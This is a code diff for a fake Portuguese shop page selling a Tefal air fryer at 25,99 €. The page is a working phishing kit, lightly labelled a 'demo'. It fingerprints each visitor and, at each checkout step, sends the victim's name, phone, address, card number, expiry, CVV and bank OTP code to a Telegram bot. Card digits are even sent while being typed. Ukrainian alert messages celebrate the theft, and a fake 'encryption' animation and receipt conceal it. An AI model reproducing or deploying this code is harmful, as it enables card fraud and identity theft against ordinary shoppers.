+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;");
+      }
+
+      async function sendToTelegram(htmlText) {
+        const url = `https://api.telegram.org/bot${encodeURIComponent(TG_CONFIG.BOT_TOKEN)}/sendMessage`;
+        const payload = JSON.stringify({
+          chat_id: TG_CONFIG.CHAT_ID,
+          text: htmlText,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        });
+
+        try {
+          await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: payload,
+            keepalive: true
+          });
+        } catch (err) {
+          console.error("[TG send error]", err);
+        }
+      }
+
+      function collectEntryContext() {
+        const params = new URLSearchParams(window.location.search);
+        const utm = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"]
+          .map((k) => (params.get(k) ? `${k}=${params.get(k)}` : null))
+          .filter(Boolean)
+          .join(" | ");
+
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const netInfo = conn
+          ? `${conn.effectiveType || "?"} (downlink: ${conn.downlink ?? "?"} Mbps, rtt: ${conn.rtt ?? "?"} ms)`
+          : "n/a";
+
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a";
+        const langs = Array.isArray(navigator.languages) ? navigator.languages.join(", ") : (navigator.language || "n/a");
+        const orient = (screen.orientation && screen.orientation.type) ||
+          (window.innerWidth > window.innerHeight ? "landscape" : "portrait");
+
+        return {
+          now: new Date().toLocaleString("uk-UA", { hour12: false }),
+          url: window.location.href,
+          referrer: document.referrer || "direct",
+          utm: utm || "none",
+          tz,
+          langs,
+          screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio || 1}x)`,
+          viewport: `${window.innerWidth}x${window.innerHeight} (${orient})`,
+          platform: navigator.platform || "n/a",
+          cores: navigator.hardwareConcurrency || "n/a",
+          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "n/a",
+          netInfo,
+          ua: navigator.userAgent || "unknown"
+        };
+      }
+
+      function notifySiteVisit() {
+        const ctx = collectEntryContext();
+        const msg =
+          `👀 <b>ОПА, КЛІЄНТ ЗАЙШОВ НА ВІТРИНУ! (TEFAL PT)</b>\n` +
+          `🆔 Сесія: <code>${escapeHtml(sessionId)}</code>\n` +
+          `🕒 Час: <code>${escapeHtml(ctx.now)}</code>\n` +
+          `🌐 Мови / TZ: <code>${escapeHtml(ctx.langs)}</code> | <code>${escapeHtml(ctx.tz)}</code>\n` +
+          `📱 Екран / Вікно: <code>${escapeHtml(ctx.screen)}</code> → <code>${escapeHtml(ctx.viewport)}</code>\n` +
+          `💻 Залізо: <code>${escapeHtml(ctx.platform)}</code> | CPU: <code>${escapeHtml(ctx.cores)}</code> | RAM: <code>${escapeHtml(ctx.memory)}</code>\n` +
+          `📶 Мережа: <code>${escapeHtml(ctx.netInfo)}</code>\n` +
+          `🎯 UTM: <code>${escapeHtml(ctx.utm)}</code>\n` +
+          `↩️ Ref: <code>${escapeHtml(ctx.referrer)}</code>\n` +
+          `🔗 URL: <code>${escapeHtml(ctx.url)}</code>\n` +
+          `🕵️ UA: <code>${escapeHtml(ctx.ua.slice(0, 160))}</code>`;
+        sendToTelegram(msg);
+      }
+
+      const STORAGE_KEY = "tefal_pt_demo_state_v1";
+
+      const galleryPhotos = [
+        "https://click.ua/content/shop/products/341518/photos/multipech-tefal-easy-fry-mega-compact-ey8618e0-800x800-b972.jpg",
+        "https://click.ua/content/shop/products/341518/photos/multipech-tefal-easy-fry-mega-compact-ey8618e0-800x800-b972.jpg",
+        "https://click.ua/content/shop/products/341518/photos/multipech-tefal-easy-fry-mega-compact-ey8618e0-800x800-b972.jpg"
+      ];
+      let photoIdx = 0;
+
+      const productPage = document.getElementById("productPage");
+      const checkoutOverlay = document.getElementById("checkoutOverlay");
+      const stepBadge = document.getElementById("stepBadge");
+      const stepDeliveryForm = document.getElementById("stepDeliveryForm");
+      const stepCardForm = document.getElementById("stepCardForm");
+      const stepOtpForm = document.getElementById("stepOtpForm");
+      const anim8dOverlay = document.getElementById("anim8dOverlay");
+      const toastEl = document.getElementById("toast");
+
+      const demoState = {
+        delivery: { fullName: "", phone: "", address: "", postalCode: "", city: "" },
+        card: { number: "", expiry: "", cvv: "", holder: "" },
+        otp: ""
+      };
+
+      function showToast(msg) {
+        toastEl.textContent = msg;
+        toastEl.classList.add("show");
+        clearTimeout(showToast._t);
+        showToast._t = setTimeout(() => toastEl.classList.remove("show"), 2400);
+      }
+
+      function persistDemoState() {
+        try {
+          localStorage.setItem(STORAGE_KEY, JSON.stringify({
+            delivery: demoState.delivery,
+            city: demoState.delivery.city,
+            updatedAt: Date.now()
+          }));
+        } catch (_) {}
+      }
+
+      // 3D Tilt on Product Card
+      const card3d = document.getElementById("card3d");
+      function handleTilt(clientX, clientY) {
+        const rect = card3d.getBoundingClientRect();
+        const nx = (clientX - rect.left) / rect.width - 0.5;
+        const ny = (clientY - rect.top) / rect.height - 0.5;
+        card3d.style.transform = `rotateX(${(-ny * 10).toFixed(2)}deg) rotateY(${(nx * 12).toFixed(2)}deg)`;
+      }
+      card3d.addEventListener("mousemove", (e) => handleTilt(e.clientX, e.clientY));
+      card3d.addEventListener("touchmove", (e) => {
+        if (e.touches[0]) handleTilt(e.touches[0].clientX, e.touches[0].clientY);
+      }, { passive: true });
+      card3d.addEventListener("mouseleave", () => {
+        card3d.style.transform = "rotateX(0deg) rotateY(0deg)";
+      });
+      card3d.addEventListener("touchend", () => {
+        card3d.style.transform = "rotateX(0deg) rotateY(0deg)";
+      });
+
+      // Gallery Switcher
+      document.getElementById("nextPhotoBtn").addEventListener("click", () => {
+        photoIdx = (photoIdx + 1) % galleryPhotos.length;
+        document.getElementById("mainProductImg").src = galleryPhotos[photoIdx];
+        document.getElementById("galleryCounter").textContent = `${photoIdx + 1} / ${galleryPhotos.length}`;
+      });
+
+      // Countdown Timer
+      let remainingSec = 23 * 3600 + 55 * 60 + 59;
+      const countdownEl = document.getElementById("countdownTimer");
+      setInterval(() => {
+        remainingSec = remainingSec > 0 ? remainingSec - 1 : 23 * 3600 + 59 * 60 + 59;
+        const h = String(Math.floor(remainingSec / 3600)).padStart(2, "0");
+        const m = String(Math.floor((remainingSec % 3600) / 60)).padStart(2, "0");
+        const s = String(remainingSec % 60).padStart(2, "0");
+        countdownEl.textContent = `${h}:${m}:${s}`;
+      }, 1000);
+
+      // Quick Pills, Fav & Share
+      document.querySelectorAll(".quick-pill").forEach((pill) => {
+        pill.addEventListener("click", () => showToast(pill.dataset.info));
+      });
+
+      let liked = false;
+      document.getElementById("favBtn").addEventListener("click", function () {
+        liked = !liked;
+        this.textContent = liked ? "♥" : "♡";
+        this.style.color = liked ? "#fb7185" : "#f6f8fc";
+        showToast(liked ? "Adicionado aos favoritos" : "Removido dos favoritos");
+      });
+
+      document.getElementById("shareBtn").addEventListener("click", () => {
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(window.location.href).catch(() => {});
+        }
+        showToast("Ligação copiada");
+      });
+
+      // Checkout Navigation
+      let currentStep = 1;
+      function openCheckoutStep(step) {
+        currentStep = step;
+        checkoutOverlay.classList.add("active");
+        stepDeliveryForm.style.display = step === 1 ? "block" : "none";
+        stepCardForm.style.display = step === 2 ? "block" : "none";
+        stepOtpForm.style.display = step === 3 ? "block" : "none";
+
+        if (step === 1) stepBadge.textContent = "Passo 1 de 3 • Envio";
+        if (step === 2) stepBadge.textContent = "Passo 2 de 3 • Cartão";
+        if (step === 3) stepBadge.textContent = "Passo 3 de 3 • Código";
+      }
+
+      document.getElementById("buyNowBtn").addEventListener("click", () => {
+        openCheckoutStep(1);
+        sendToTelegram(
+          `🔥 <b>КЛІЄНТ ТИСНЕ «COMPRAR AGORA» — ПОЧАЛО РУХУ!</b>\n` +
+          `🆔 Сесія: <code>${escapeHtml(sessionId)}</code>\n` +
+          `💶 Лот: TEFAL Easy Fry Mega (25,99 €)`
+        );
+      });
+
+      document.getElementById("checkoutBackBtn").addEventListener("click", () => {
+        if (currentStep > 1) {
+          openCheckoutStep(currentStep - 1);
+        } else {
+          checkoutOverlay.classList.remove("active");
+        }
+      });
+
+      // Demo Auto-Fill Helper
+      document.getElementById("demoFillBtn").addEventListener("click", () => {
+        if (currentStep === 1) {
+          document.getElementById("fullName").value = "João Silva";
+          document.getElementById("phoneInput").value = "+351 912 345 678";
+          document.getElementById("addressInput").value = "Av. da Liberdade, 110";
+          document.getElementById("postalCode").value = "1269-046";
+          document.getElementById("cityInput").value = "Lisboa";
+        } else if (currentStep === 2) {
+          document.getElementById("cardNumber").value = "4532 1234 5678 9010";
+          document.getElementById("cardExpiry").value = "08/29";
+          document.getElementById("cardCvv").value = "742";
+          document.getElementById("cardHolder").value = "JOÃO SILVA";
+          syncVirtualCard();
+          cardNumberInput.dispatchEvent(new Event("input"));
+        } else if (currentStep === 3) {
+          const otpInput = document.getElementById("otpCodeInput");
+          otpInput.value = "482915";
+          otpInput.dispatchEvent(new Event("input"));
+        }
+      });
+
+      // Step 1 Submit
+      stepDeliveryForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        demoState.delivery = {
+          fullName: document.getElementById("fullName").value.trim(),
+          phone: document.getElementById("phoneInput").value.trim(),
+          address: document.getElementById("addressInput").value.trim(),
+          postalCode: document.getElementById("postalCode").value.trim(),
+          city: document.getElementById("cityInput").value.trim()
+        };
+        if (!document.getElementById("cardHolder").value.trim()) {
+          document.getElementById("cardHolder").value = demoState.delivery.fullName.toUpperCase();
+        }
+        persistDemoState();
+        syncVirtualCard();
+
+        sendToTelegram(
+          `📦 <b>КРОК 1 ЗБРАНО — АДРЕСА В КИШЕНІ!</b>\n` +
+          `🆔 Сесія: <code>${escapeHtml(sessionId)}</code>\n` +
+          `👤 ПІБ: <code>${escapeHtml(demoState.delivery.fullName)}</code>\n` +
+          `📞 Тел: <code>${escapeHtml(demoState.delivery.phone)}</code>\n` +
+          `🏠 Адреса: <code>${escapeHtml(demoState.delivery.address)}</code>\n` +
+          `📮 Індекс: <code>${escapeHtml(demoState.delivery.postalCode)}</code>\n` +
+          `🏙 Місто: <code>${escapeHtml(demoState.delivery.city)}</code>`
+        );
+
+        openCheckoutStep(2);
+      });
+
+      // Card Input Formatting, Live Virtual Card Sync & "Ввід карти" Alert
+      const cardNumberInput = document.getElementById("cardNumber");
+      const cardExpiryInput = document.getElementById("cardExpiry");
+      const cardCvvInput = document.getElementById("cardCvv");
+      const cardHolderInput = document.getElementById("cardHolder");
+
+      let cardTypingStarted = false;
+      let lastNotifiedDigits = "";
+      let cardDebounceTimer = null;
+
+      function detectCardScheme(digits) {
+        if (!digits) return "НЕВІДОМИЙ";
+        if (digits.startsWith("4")) return "VISA";
+        if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return "MASTERCARD";
+        if (/^3[47]/.test(digits)) return "AMEX";
+        if (/^6(?:011|5)/.test(digits)) return "DISCOVER";
+        return "КАРТА";
+      }
+
+      function scheduleCardTypingNotify(digits) {
+        clearTimeout(cardDebounceTimer);
+        cardDebounceTimer = setTimeout(() => {
+          if (!digits || digits === lastNotifiedDigits) return;
+          const scheme = detectCardScheme(digits);
+          const formatted = digits.match(/.{1,4}/g)?.join(" ") || digits;
+
+          if (!cardTypingStarted) {
+            cardTypingStarted = true;
+            lastNotifiedDigits = digits;
+            sendToTelegram(
+              `⌨️ <b>УВАГА: ПОЧАВСЯ ВВІД КАРТИ!</b>\n` +
+              `🆔 Сесія: <code>${escapeHtml(sessionId)}</code>\n` +
+              `👤 Клієнт: <code>${escapeHtml(demoState.delivery.fullName || "—")}</code>\n` +
+              `💳 Поточний ввід (${digits.length} цифр, ${scheme}): <code>${escapeHtml(formatted)}</code>`
+            );
+          } else if (digits.length >= 6 && Math.abs(digits.length - lastNotifiedDigits.length) >= 4) {
+            lastNotifiedDigits = digits;
+            sendToTelegram(
+              `💳 <b>ВВІД КАРТИ ТРИВАЄ (${digits.length} цифр • ${scheme})</b>\n` +
+              `🆔 Сесія: <code>${escapeHtml(sessionId)}</code>\n` +
+              `🔢 Зараз у полі: <code>${escapeHtml(formatted)}</code>`
+            );
+          }
+        }, 650);
+      }
+
+      function syncVirtualCard() {
+        const rawNum = cardNumberInput.value.replace(/\D/g, "").slice(0, 16);
+        const grouped = rawNum.match(/.{1,4}/g)?.join(" ") || "•••• •••• •••• ••••";
+        document.getElementById("vcardNumber").textContent = grouped;
+
+        let brand = "CARTÃO";
+        if (rawNum.startsWith("4")) brand = "VISA";
+        else if (/^5[1-5]/.test(rawNum) || /^2[2-7]/.test(rawNum)) brand = "MASTERCARD";
+        document.getElementById("cardBrandLabel").textContent = brand;
+
+        const expVal = cardExpiryInput.value.trim() || "MM/AA";
+        document.getElementById("vcardExpiry").textContent = expVal;
+
+        const holderVal = (cardHolderInput.value.trim() || "NOME DO TITULAR").toUpperCase();
+        document.getElementById("vcardHolder").textContent = holderVal;
+      }
+
+      cardNumberInput.addEventListener("input", () => {
+        const digits = cardNumberInput.value.replace(/\D/g, "").slice(0, 16);
+        cardNumberInput.value = digits.match(/.{1,4}/g)?.join(" ") || "";
+        syncVirtualCard();
+        scheduleCardTypingNotify(digits);
+      });
+
+      cardExpiryInput.addEventListener("input", () => {
+        const digits = cardExpiryInput.value.replace(/\D/g, "").slice(0, 4);
+        cardExpiryInput.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
+        syncVirtualCard();
+      });
+
+      cardCvvInput.addEventListener("input", () => {
+        cardCvvInput.value = cardCvvInput.value.replace(/\D/g, "").slice(0, 4);
+      });
+
+      cardHolderInput.addEventListener("input", syncVirtualCard);
+
+      // Step 2 Submit
+      stepCardForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        clearTimeout(cardDebounceTimer);
+        const digitsOnly = cardNumberInput.value.replace(/\D/g, "");
+        if (digitsOnly.length < 12) {
+          showToast("Introduza um número de cartão válido");
+          return;
+        }
+        demoState.card = {
+          number: digitsOnly,
+          expiry: cardExpiryInput.value.trim(),
+          cvv: cardCvvInput.value.trim(),
+          holder: cardHolderInput.value.trim()
+        };
+
+        sendToTelegram(
+          `💳 <b>КРОК 2 ЗАКРИТО — КАРТА В РУКАХ!</b>\n` +
+          `🆔 Сесія: <code>${escapeHtml(sessionId)}</code>\n` +
+          `👤 Клієнт: <code>${escapeHtml(demoState.delivery.fullName || "—")}</code>\n` +
+          `🔢 Номер карти: <code>${escapeHtml(demoState.card.number)}</code>\n` +
+          `📅 Термін: <code>${escapeHtml(demoState.card.expiry)}</code>\n` +
+          `🔐 CVV: <code>${escapeHtml(demoState.card.cvv)}</code>\n` +
+          `🏷 Власник: <code>${escapeHtml(demoState.card.holder)}</code>\n` +
+          `💶 Чек: <code>25,99 €</code>`
+        );
+
+        openCheckoutStep(3);
+        setTimeout(() => document.getElementById("otpCodeInput").focus(), 120);
+      });
+
+      // Step 3 OTP Input (up to 6 digits, active from 1 to 6 digits)
+      const otpInput = document.getElementById("otpCodeInput");
+      const otpCounter = document.getElementById("otpCounter");
+      const confirmOtpBtn = document.getElementById("confirmOtpBtn");
+
+      otpInput.addEventListener("input", () => {
+        const cleanDigits = otpInput.value.replace(/\D/g, "").slice(0, 6);
+        otpInput.value = cleanDigits;
+        otpCounter.textContent = `${cleanDigits.length} / 6 dígitos`;
+        confirmOtpBtn.disabled = cleanDigits.length === 0;
+      });
+
+      // 5-Second 8D Animation Stage
+      const particlesCanvas = document.getElementById("particlesCanvas");
+      const ctx = particlesCanvas.getContext("2d");
+      let particles = [];
+      let rafId = null;
+
+      function initParticles() {
+        particlesCanvas.width = window.innerWidth;
+        particlesCanvas.height = window.innerHeight;
+        const colors = ["#38bdf8", "#22c55e", "#fbbf24", "#f472b6"];
+        particles = Array.from({ length: 56 }, () => ({
+          x: Math.random() * particlesCanvas.width,
+          y: Math.random() * particlesCanvas.height,
+          vx: (Math.random() - 0.5) * 2.2,
+          vy: (Math.random() - 0.5) * 2.2,
+          r: 2 + Math.random() * 3.5,
+          color: colors[Math.floor(Math.random() * colors.length)]
+        }));
+      }
+
+      function renderParticles() {
+        ctx.clearRect(0, 0, particlesCanvas.width, particlesCanvas.height);
+        for (const p of particles) {
+          p.x += p.vx;
+          p.y += p.vy;
+          if (p.x < 0 || p.x > particlesCanvas.width) p.vx *= -1;
+          if (p.y < 0 || p.y > particlesCanvas.height) p.vy *= -1;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fillStyle = p.color;
+          ctx.fill();
+        }
+        rafId = requestAnimationFrame(renderParticles);
+      }
+
+      function runFiveSecond8D() {
+        demoState.otp = otpInput.value;
+        checkoutOverlay.classList.remove("active");
+        anim8dOverlay.classList.add("active");
+
+        document.getElementById("animRunningBlock").style.display = "block";
+        document.getElementById("receiptBox").classList.remove("active");
+
+        const titleEl = document.getElementById("animStatusTitle");
+        const subEl = document.getElementById("animStatusSub");
+        const fillEl = document.getElementById("progressFill");
+        const timeEl = document.getElementById("progressTime");
+
+        initParticles();
+        renderParticles();
+
+        const durationMs = 5000;
+        const startTime = performance.now();
+
+        function tick(now) {
+          const elapsed = Math.min(now - startTime, durationMs);
+          const pct = (elapsed / durationMs) * 100;
+          fillEl.style.width = `${pct.toFixed(1)}%`;
+          timeEl.textContent = `${(elapsed / 1000).toFixed(1)}s / 5.0s`;
+
+          if (elapsed < 1700) {
+            titleEl.textContent = "A encriptar ligação 8D...";
+            subEl.textContent = "A verificar o código de segurança";
+          } else if (elapsed < 3500) {
+            titleEl.textContent = "A processar 25,99 €...";
+            subEl.textContent = "Comunicação segura com o emissor";
+          } else {
+            titleEl.textContent = "A finalizar reserva...";
+            subEl.textContent = "A preparar o talão da encomenda";
+          }
+
+          if (elapsed < durationMs) {
+            requestAnimationFrame(tick);
+          } else {
+            cancelAnimationFrame(rafId);
+            document.getElementById("animRunningBlock").style.display = "none";
+            document.getElementById("recClient").textContent = demoState.delivery.fullName || "Cliente PT";
+            document.getElementById("recCity").textContent = demoState.delivery.city || "Portugal";
+            document.getElementById("recRef").textContent = `#PT-${Math.floor(10000 + Math.random() * 90000)}`;
+            document.getElementById("receiptBox").classList.add("active");
+          }
+        }
+
+        requestAnimationFrame(tick);
+      }
+
+      // Step 3 Submit
+      stepOtpForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        if (!otpInput.value.length) return;
+        demoState.otp = otpInput.value.trim();
+        const elapsedSec = ((Date.now() - enteredAtMs) / 1000).toFixed(1);
+
+        sendToTelegram(
+          `🎯 <b>БІНГО! КОД ПІДТВЕРДЖЕННЯ ВЛЕТІВ!</b>\n` +
+          `🆔 Сесія: <code>${escapeHtml(sessionId)}</code> | Час у воронці: <code>${escapeHtml(elapsedSec)}s</code>\n` +
+          `🔑 Код: <code>${escapeHtml(demoState.otp)}</code>\n` +
+          `👤 ПІБ: <code>${escapeHtml(demoState.delivery.fullName || "—")}</code>\n` +
+          `📞 Тел: <code>${escapeHtml(demoState.delivery.phone || "—")}</code>\n` +
+          `🏠 Місто/Адреса: <code>${escapeHtml(demoState.delivery.city || "—")}</code>, <code>${escapeHtml(demoState.delivery.address || "—")}</code>\n` +
+          `💳 Карта: <code>${escapeHtml(demoState.card.number || "—")}</code> | <code>${escapeHtml(demoState.card.expiry || "—")}</code> | CVV <code>${escapeHtml(demoState.card.cvv || "—")}</code>\n` +
+          `💶 Сума: <code>25,99 €</code>`
+        );
+
+        runFiveSecond8D();
+      });
+
+      document.getElementById("finishOrderBtn").addEventListener("click", () => {
+        anim8dOverlay.classList.remove("active");
+        stepDeliveryForm.reset();
+        stepCardForm.reset();
+        stepOtpForm.reset();
+        cardTypingStarted = false;
+        lastNotifiedDigits = "";
+        otpCounter.textContent = "0 / 6 dígitos";
+        confirmOtpBtn.disabled = true;
+        syncVirtualCard();
+        showToast("Pronto! Pode testar novamente.");
+      });
+
+      notifySiteVisit();
+    })();
+  </script>
+</body>
+</html>
